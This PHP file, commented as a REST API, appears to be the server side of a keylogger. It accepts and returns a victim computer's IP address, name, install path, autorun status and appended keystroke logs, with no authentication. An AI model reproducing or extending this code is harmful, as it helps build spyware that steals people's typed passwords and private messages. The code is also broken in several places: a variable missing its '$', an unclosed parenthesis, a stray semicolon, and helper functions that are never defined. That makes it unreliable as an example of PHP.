<?php
    /**
     *  @author Samuel Finocchio <samuelfinocchioit@gmail.com>
     *  REST API
     */
    header ('Content-type: application/json');
    result = json_encode(null);
    
    if(!isset($_GET['get']) && !isset($_POST['set'])
        die('No action specified');
    
    if($_SERVER['REQUEST_METHOD'] == 'GET')
        $get = $_GET['get'];
    
    if($_SERVER['REQUEST_METHOD'] == 'POST') {
        $set = $_POST['set'];
        $value = $_POST['value'];
    }
    
    switch ($get)
    {
        // GET IP Address
        case 'ip_address':
            $result = json_encode (
                getIP()
            );
        break;
    
        // GET Computer Name
        case 'computer_name':
            $result = json_encode (
                getComputerName()  
            );
        break;
    
        // GET Installation Path
        case 'installation_path':
            $result = json_encode (
                getInstallationPath();
            );
        break;

        // GET autorun
        case 'autorun':
            $result = json_encode (
                getAutorun()
            );
        break;
    
        // GET keystrokes
        case 'keystrokes':
            $result = json_encode (
                getKeystrokes()
            );
        break;
    
        // GET installed
        case 'installed':
            $result = json_encode (
                getInstalled()
            );
        break;
            
        // GET error
        case 'error':
            $result = json_encode (
                getError()
            );
        break;
    }
    
    switch ($set)
    {
        // SET IP Address
        case 'ip_address':
            setIPAddress($value);
        break;
    
        // SET Computer Name
        case 'computer_name':
            setComputerName($value);
        break;
    
        // SET Installation Path
        case 'installation_path':
            setInstallationPath($value);
        break;

        // SET autorun
        case 'autorun':
            setAutorun($value);
        break;
    
        // SET keystrokes
        case 'keystrokes':
            appendKeystrokes($value);
        break;
    
        // SET installed
        case 'installed':
            setInstalled($value);
        break;
    
        // SET error
        case 'error':
            setError($value);
        break;
    
        // SET reset
        case 'reset':
            reset($value);
    }
    
    // Sends response if any
    if(isset($result))
        echo $result;
?>